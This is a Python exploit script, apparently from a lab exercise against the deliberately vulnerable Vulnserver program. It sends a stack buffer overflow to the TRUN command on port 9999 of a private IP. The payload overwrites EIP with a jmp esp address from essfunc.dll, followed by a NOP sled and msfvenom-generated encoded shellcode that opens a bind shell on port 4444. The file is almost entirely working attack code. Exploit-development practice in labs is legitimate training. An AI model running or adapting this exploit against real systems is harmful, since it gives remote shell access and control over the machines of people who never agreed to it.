import socket

target = "192.168.110.132"
port = 9999

command = b"TRUN /.:/"

# msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LPORT=4444 -e x86/alpha_mixed -b '\x00' -f python -v shell
shell =  b""
shell += b"\x89\xe1\xdb\xc2\xd9\x71\xf4\x5b\x53\x59\x49\x49"
shell += b"\x49\x49\x49\x49\x49\x49\x49\x49\x43\x43\x43\x43"
shell += b"\x43\x43\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30"
shell += b"\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
shell += b"\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49"
shell += b"\x6b\x4c\x49\x78\x6b\x32\x33\x30\x75\x50\x77\x70"
shell += b"\x43\x50\x6b\x39\x49\x75\x56\x51\x39\x50\x45\x34"
shell += b"\x6c\x4b\x42\x70\x34\x70\x4e\x6b\x33\x62\x36\x6c"
shell += b"\x4c\x4b\x36\x32\x46\x74\x6e\x6b\x32\x52\x67\x58"
shell += b"\x54\x4f\x4e\x57\x71\x5a\x55\x76\x35\x61\x79\x6f"
shell += b"\x4e\x4c\x67\x4c\x70\x61\x33\x4c\x47\x72\x56\x4c"
shell += b"\x51\x30\x5a\x61\x68\x4f\x66\x6d\x75\x51\x4b\x77"
shell += b"\x69\x72\x39\x62\x70\x52\x62\x77\x6c\x4b\x76\x32"
shell += b"\x42\x30\x4c\x4b\x61\x5a\x65\x6c\x6c\x4b\x70\x4c"
shell += b"\x44\x51\x43\x48\x7a\x43\x67\x38\x37\x71\x6b\x61"
shell += b"\x66\x31\x6c\x4b\x31\x49\x51\x30\x75\x51\x6b\x63"
shell += b"\x6c\x4b\x37\x39\x32\x38\x4a\x43\x56\x5a\x32\x69"
shell += b"\x6e\x6b\x34\x74\x4e\x6b\x36\x61\x5a\x76\x46\x51"
shell += b"\x4b\x4f\x4c\x6c\x69\x51\x6a\x6f\x74\x4d\x63\x31"
shell += b"\x4b\x77\x70\x38\x79\x70\x51\x65\x4a\x56\x73\x33"
shell += b"\x73\x4d\x4a\x58\x75\x6b\x61\x6d\x47\x54\x53\x45"
shell += b"\x39\x74\x70\x58\x6e\x6b\x53\x68\x55\x74\x63\x31"
shell += b"\x78\x53\x50\x66\x6c\x4b\x56\x6c\x30\x4b\x4c\x4b"
shell += b"\x63\x68\x67\x6c\x33\x31\x38\x53\x6e\x6b\x76\x64"
shell += b"\x6e\x6b\x77\x71\x4a\x70\x6c\x49\x67\x34\x44\x64"
shell += b"\x56\x44\x53\x6b\x73\x6b\x73\x51\x52\x79\x51\x4a"
shell += b"\x50\x51\x79\x6f\x4d\x30\x43\x6f\x33\x6f\x52\x7a"
shell += b"\x6c\x4b\x74\x52\x4a\x4b\x6c\x4d\x61\x4d\x33\x58"
shell += b"\x76\x53\x76\x52\x55\x50\x55\x50\x65\x38\x64\x37"
shell += b"\x73\x43\x77\x42\x53\x6f\x43\x64\x75\x38\x32\x6c"
shell += b"\x50\x77\x64\x66\x43\x37\x6b\x4f\x4e\x35\x4e\x58"
shell += b"\x5a\x30\x53\x31\x57\x70\x67\x70\x77\x59\x5a\x64"
shell += b"\x61\x44\x52\x70\x53\x58\x51\x39\x4b\x30\x30\x6b"
shell += b"\x57\x70\x49\x6f\x6b\x65\x43\x5a\x37\x78\x62\x79"
shell += b"\x32\x70\x4d\x32\x79\x6d\x71\x50\x52\x70\x57\x30"
shell += b"\x72\x70\x55\x38\x7a\x4a\x54\x4f\x4b\x6f\x79\x70"
shell += b"\x69\x6f\x68\x55\x7a\x37\x30\x68\x43\x32\x73\x30"
shell += b"\x42\x31\x53\x6c\x6c\x49\x79\x76\x42\x4a\x44\x50"
shell += b"\x43\x66\x43\x67\x73\x58\x6f\x32\x39\x4b\x67\x47"
shell += b"\x30\x67\x79\x6f\x6b\x65\x53\x67\x51\x78\x38\x37"
shell += b"\x6b\x59\x65\x68\x79\x6f\x39\x6f\x79\x45\x70\x57"
shell += b"\x62\x48\x42\x54\x4a\x4c\x65\x6b\x38\x61\x79\x6f"
shell += b"\x58\x55\x63\x67\x4c\x57\x73\x58\x61\x65\x50\x6e"
shell += b"\x62\x6d\x35\x31\x59\x6f\x4b\x65\x62\x48\x35\x33"
shell += b"\x30\x6d\x50\x64\x47\x70\x6d\x59\x6b\x53\x33\x67"
shell += b"\x33\x67\x72\x77\x54\x71\x48\x76\x50\x6a\x56\x72"
shell += b"\x43\x69\x62\x76\x59\x72\x6b\x4d\x51\x76\x4f\x37"
shell += b"\x63\x74\x34\x64\x75\x6c\x77\x71\x47\x71\x4c\x4d"
shell += b"\x73\x74\x64\x64\x46\x70\x38\x46\x77\x70\x31\x54"
shell += b"\x31\x44\x52\x70\x61\x46\x42\x76\x33\x66\x52\x66"
shell += b"\x31\x46\x70\x4e\x50\x56\x43\x66\x62\x73\x52\x76"
shell += b"\x52\x48\x44\x39\x48\x4c\x37\x4f\x6e\x66\x39\x6f"
shell += b"\x7a\x75\x4c\x49\x39\x70\x50\x4e\x70\x56\x37\x36"
shell += b"\x6b\x4f\x36\x50\x52\x48\x56\x68\x6f\x77\x45\x4d"
shell += b"\x73\x50\x6b\x4f\x39\x45\x6d\x6b\x58\x70\x6e\x55"
shell += b"\x79\x32\x42\x76\x53\x58\x4e\x46\x6f\x65\x4f\x4d"
shell += b"\x4d\x4d\x6b\x4f\x48\x55\x35\x6c\x63\x36\x31\x6c"
shell += b"\x47\x7a\x4f\x70\x39\x6b\x6b\x50\x42\x55\x76\x65"
shell += b"\x4f\x4b\x72\x67\x45\x43\x63\x42\x52\x4f\x62\x4a"
shell += b"\x67\x70\x63\x63\x49\x6f\x58\x55\x41\x41"


buffer =  b""
buffer += b"\x41" * (2003 - len(buffer))
#buffer += b"\x42" * 4
buffer += b"\x03\x12\x50\x62"  # EIP  - 0x62501203 : jmp esp - essfunc.dll
buffer += b"\x90" * 15
buffer += shell
buffer += b"\x44" * (2900 - len(buffer))


try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target,port))
    sock.recv(1024)

    payload = command + buffer
    #sock.send(payload.encode("utf-8"))
    sock.send(payload)
    
    print("Buffering with: "+str(len(buffer))+" characters...",end="\r")
except ConnectionRefusedError:
    print("Connection error. Review the IP address or port.")
    exit()
except socket.timeout:
    sock.close()
    print("\nConnection error. Timeout!")
except socket.error:
    sock.close()
    print("\nPwned? Maybe the binary crashed with "+str(len(buffer))+" \"A\" characters :)")
    exit()
except KeyboardInterrupt:
    sock.close()
    print("\n\nConnection closed. Bye!")
    exit()